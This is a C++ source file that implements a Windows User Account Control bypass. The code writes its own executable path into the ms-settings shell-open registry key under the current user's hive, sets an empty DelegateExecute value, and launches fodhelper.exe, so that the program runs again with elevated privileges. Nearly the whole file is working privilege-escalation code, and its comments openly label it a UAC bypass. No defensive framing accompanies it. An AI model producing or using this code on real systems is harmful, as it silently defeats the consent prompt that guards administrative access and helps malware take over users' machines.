// Include necessary headers for Windows API functions, registry access, GUI components, file operations, and strings.
#include <winsock2.h>
#include <windows.h>
#include <CommCtrl.h>
#include <tchar.h>
#include <shlobj.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <string>

// Get the current executable's path as a wide string.
std::wstring GetExecutablePath() {
    wchar_t path[MAX_PATH]; // Define a buffer to store the path.
    GetModuleFileNameW(NULL, path, MAX_PATH); // Get the file name of the executable containing the current process.
    return std::wstring(path); // Return the path as a wide string.
}

// Set a registry value.
LSTATUS SetRegValue(HKEY keyHandle, const wchar_t* valueTitle, const wchar_t* valueData) {
    // Set the value in the registry to launch the executable or command.
    return RegSetValueEx(keyHandle, valueTitle, 0, REG_SZ, (const BYTE*)valueData, (wcslen(valueData) + 1) * sizeof(wchar_t));
}

// Configure the registry to enable the UAC bypass.
int ConfigureRegistry() {
    HKEY keyHandle; // Handle to the registry key.
    DWORD disposition; // Disposition value for registry operation.

    std::wstring exePath = GetExecutablePath(); // Get the current executable's path.

    // Command to be inserted into the registry that triggers the UAC bypass.
    std::wstring command = L"cmd /c start \"Terminal1\" C:\\Windows\\System32\\cmd.exe /c " + exePath;

    std::wstring delegateExec = L""; // Empty string for delegate execute, not used in this example.

    // Create or open the registry key.
    LSTATUS status = RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0, KEY_WRITE, NULL, &keyHandle, &disposition);
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to open or create reg key\n");
        return 1; // Return error if failed to create or open the key.
    }

    // Set the registry value for the command.
    status = SetRegValue(keyHandle, L"", command.c_str());
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to set reg value\n");
        RegCloseKey(keyHandle); // Close the key handle on failure.
        return 1;
    }

    // Attempt to set the DelegateExecute value, not necessary in this context but shows potential for extension.
    status = SetRegValue(keyHandle, L"DelegateExecute", delegateExec.c_str());
    if (status != ERROR_SUCCESS) {
        wprintf(L"Failed to set reg value: DelegateExecute\n");
        RegCloseKey(keyHandle); // Close the key handle on failure.
        return 1;
    }

    wprintf(L"Successfully created reg key and set reg values!!\n");
    RegCloseKey(keyHandle); // Close the key handle on success.
    return 0; // Return success.
}

// Initiate a process with elevated privileges.
int InitiateElevatedProc() {
    SHELLEXECUTEINFO execInfo = { sizeof(execInfo) }; // Initialize execution information structure.

    execInfo.lpVerb = L"runas"; // Specify "runas" verb to elevate privileges.
    execInfo.lpFile = L"C:\\Windows\\System32\\fodhelper.exe"; // Set the file to execute (fodhelper.exe, a Windows binary).
    execInfo.hwnd = NULL; // No window handle.
    execInfo.nShow = SW_NORMAL; // Show window normally.

    // Attempt to execute the process.
    if (!ShellExecuteEx(&execInfo)) {
        DWORD errCode = GetLastError(); // Get the error code if execution fails.
        wprintf(errCode == ERROR_CANCELLED ? L"user refused to allow privileges elevation!!!!" : L"error code: %ld", errCode);
        return 1; // Return error if execution fails.
    }
    else {
        wprintf(L"succesfully create process!!=\n");
        return 0; // Return success if execution succeeds.
    }
}

// Attempt to override UAC.
int OverrideUAC() {
    // Configure the registry for UAC bypass.
    if (ConfigureRegistry() != 0) {
        return 1; // Return error if registry configuration fails.
    }
    // Initiate elevated process.
    return InitiateElevatedProc(); // Return the result of initiating the elevated process.
}
